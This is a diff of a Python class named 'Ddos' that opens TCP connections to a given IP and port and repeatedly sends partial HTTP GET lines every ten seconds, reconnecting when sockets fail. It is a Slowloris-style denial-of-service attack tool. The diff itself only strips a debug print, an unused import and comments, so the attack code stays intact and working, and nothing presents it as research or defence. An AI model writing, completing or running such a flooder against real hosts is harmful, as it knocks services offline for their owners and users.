@@ -1,18 +1,15 @@
 import socket
-from queue import Queue
 from threading import Thread
 import time
 
 class Ddos(Thread):
     def __init__(self, ip, port, errorMax = 100):
-        # Call the Thread class's init function
         Thread.__init__(self)
         self.errorMax = errorMax
         self.errorsCount = 0
         self.ip = ip
         self.port = int(port)
     def countError(self):
-        print('iciiciic')
         self.errorsCount += 1
     def run(self):
         i=0
@@ -42,11 +39,8 @@ class Ddos(Thread):
             i = 0
             while True:
                 try:
-                    i=0
                     time.sleep(10)
                     s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
-                    # send custom header with some random bytes
-                    #s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
                 except socket.error as e:
                     try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
